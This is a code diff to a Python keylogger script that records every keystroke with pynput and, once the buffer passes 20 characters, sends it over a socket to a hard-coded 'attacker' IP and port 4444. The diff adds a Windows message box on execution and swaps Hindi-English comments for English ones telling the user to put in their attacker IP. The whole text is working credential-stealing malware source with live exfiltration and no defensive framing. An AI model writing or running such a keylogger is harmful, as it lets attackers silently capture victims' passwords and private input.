@@ -2,10 +2,16 @@ import pynput.keyboard
 import socket
 import threading
 import time
+import ctypes
+import datetime
 
-# Target Linux IP & port
-IP = "192.168.0.106"   # <-- yaha apne Linux ka IP daal
-PORT = 4444           # Linux listener ka port
+# ✅ Visible popup on execution
+message = f"✅ keylogger.py executed at {datetime.datetime.now()}!"
+ctypes.windll.user32.MessageBoxW(0, message, "Keylogger Status", 0x40)
+
+# 🔒 Attacker's IP & port
+IP = "192.168.0.106"   # <-- Change this to your attacker's IP
+PORT = 4444            # Port where your listener is running
 
 log = ""
 
@@ -16,7 +22,7 @@ def send_to_attacker(message):
         s.send(message.encode())
         s.close()
     except:
-        pass  # Agar connection fail ho jaye to silently ignore
+        pass
 
 def process_key(key):
     global log
@@ -29,7 +35,7 @@ def process_key(key):
         else:
             log += f" [{key}] "
 
-    if len(log) > 20:  # Jab 20 character ho jaye to bhej do
+    if len(log) > 20:
         send_to_attacker(log)
         log = ""
 
